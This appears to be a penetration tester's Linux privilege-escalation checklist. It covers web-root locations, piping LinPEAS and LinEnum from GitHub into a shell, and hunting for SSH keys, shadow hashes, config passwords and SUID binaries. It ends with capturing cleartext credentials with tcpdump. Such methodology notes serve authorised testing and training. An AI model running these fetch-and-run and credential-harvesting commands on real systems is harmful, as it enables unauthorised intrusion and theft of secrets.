### If Webserver Exists

1. Check web configuration files and source code for vulnerabilities, hardcoded credentials, etc.
- [ ] For Apache (httpd):
	- [ ] `/var/www/html`
	- [ ] `/var/www/`
	- [ ] `/srv/http/`
	- [ ] `/usr/share/httpd/`
	- [ ] `/etc/apache2/sites-available/000-default.conf`
- [ ] For Nginx:
	- [ ] `/usr/share/nginx/html`
	- [ ] `/var/www/html`
	- [ ] `/etc/nginx/sites-available/` and `/etc/nginx/sites-enabled/`
- [ ] Other possible locations:
	- [ ] `/opt/web/`
	- [ ] `/home/user/public_html/`
	- [ ] `~/www/` or `~/html/`

### Default Methodology

1. Run Linux Priv Esc Automation Scripts. Save output to a file and transfer to Kali Box.
- [ ] LinPeas

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh | tee /tmp/linpeas.out
```

- [ ] LinEnum (Optional)

```bash
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | sh | tee /tmp/linenum.out
```

2. Perform basic box enumeration once a foothold is established
- [ ] First user checks / network checks

```bash
id && whoami && hostname
```

- [ ] Checking Sudo Privileges

```bash
sudo -l
```

- [ ] Check OS/Kernel Version

```bash
uname -a
cat /etc/os-release
```

- [ ] Check `$PATH` variable

```bash
echo $PATH
```

- [ ] List Processes running as root

```bash
ps aux | grep root
```

- [ ] Discover other users on the machine

```bash
cat /etc/passwd | grep -v nologin | grep -v false
```

- [ ] Check for SSH keys

```bash
ls -la ~/.ssh/
find / -name "id_rsa*" 2>/dev/null
```

- [ ] Check current user bash history

```bash
cat ~/.bash_history
```

- [ ] Check if Shadow is readable or Passwd is writable (check for hashes in `/etc/passwd`)

```bash
ls -la /etc/shadow
ls -la /etc/passwd
cat /etc/passwd | grep -v ':x:'
```

- [ ] Enumerate Existing Groups

```bash
cat /etc/group
id
```

- [ ] Check for running Cron Jobs

```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
```

- [ ] Check for Unmounted File Systems and Additional Drives (Weak NFS Privileges)

```bash
cat /etc/fstab
showmount -e localhost
df -h
```

- [ ] Find Writable Directories and Files

```bash
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc
```

- [ ] Enumerate All Hidden Files and directories

```bash
find / -name ".*" -type f 2>/dev/null | grep -v proc
find / -name ".*" -type d 2>/dev/null | grep -v proc
```

- [ ] Enumerate Services, Versions and binaries

```bash
systemctl list-units --type=service --state=running
dpkg -l 2>/dev/null || rpm -qa 2>/dev/null
```

- [ ] Check for accessible configuration files and scripts

```bash
find /etc -readable -type f 2>/dev/null
find / -name "*.conf" -readable 2>/dev/null | grep -v proc
```

3. Enumerate for hardcoded/cleartext credentials on the system (quickly check config files)
- [ ] **BE ESPECIALLY ATTENTIVE TO OUT OF THE ORDINARY SERVICES**

```bash
grep -ril "password\|passwd\|secret\|api_key\|token\|credential" /etc /opt /var /home 2>/dev/null
```

- [ ] Look for things in `/opt`

```bash
find /opt -type f 2>/dev/null | xargs grep -il "password\|secret" 2>/dev/null
ls -laR /opt
```

- [ ] Look for web config files

```bash
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" -o -name "*.ini" -o -name "*.env" 2>/dev/null | grep -v proc
find /var/www /srv /opt -name "web.config" -o -name "config.php" -o -name ".env" -o -name "database.yml" 2>/dev/null
```

4. Look at access rights of the user we gained a foothold with (Sudo/SUID/GUID)
- [ ] Checking for Sudo privileges

```bash
sudo -l
```

- [ ] Checking SUID/GUID Privileges

```bash
# SUID
find / -perm -4000 -type f 2>/dev/null
# SGID
find / -perm -2000 -type f 2>/dev/null
# Both
find / -perm -6000 -type f 2>/dev/null
```

- [ ] Check these rights in GTFOBins → https://gtfobins.github.io

5. Check for unique files owned by the user or by the group that the user is in

```bash
find / -user $(whoami) -type f 2>/dev/null | grep -v proc
find / -group $(id -gn) -type f 2>/dev/null | grep -v proc
id
find / -group <groupname> -type f 2>/dev/null | grep -v proc
```

6. If our user has sudo privileges over a binary not in GTFOBins, try the LD_PRELOAD Privilege Escalation Exploit [[4.2.Privilege-Escalation-Linux]]

7. If custom binaries exist with the SETUID bit set, try Shared Object Hacking [[4.2.Privilege-Escalation-Linux]] (SUID SGID Exploitation)

```bash
strace $suid_binary 2>&1 | grep "open\|access\|no such"
ldd $suid_binary
```

8. Check the groups the user is a part of and see if any are privileged groups
- [ ] LXC / LXD Group Membership [[4.2.Privilege-Escalation-Linux]]
- [ ] Docker Group Membership [[4.2.Privilege-Escalation-Linux]]
- [ ] Disk Group Membership [[4.2.Privilege-Escalation-Linux]]
- [ ] ADM Group Membership [[4.2.Privilege-Escalation-Linux]]

21. If tcpdump exists, try capturing cleartext traffic for credentials

```bash
which tcpdump

# Capture ทุก interface

# เฉพาะ port cleartext protocols
tcpdump -i any port 21 or port 23 or port 80 or port 110 or port 143 -w /tmp/capture.pcap

# ดู plaintext ตรงๆ
tcpdump -i any -A port 80 | grep -i "password\|pass\|login\|user"

# อ่านบน Kali
strings /tmp/capture.pcap | grep -i "pass\|user\|login"
wireshark /tmp/capture.pcap
```
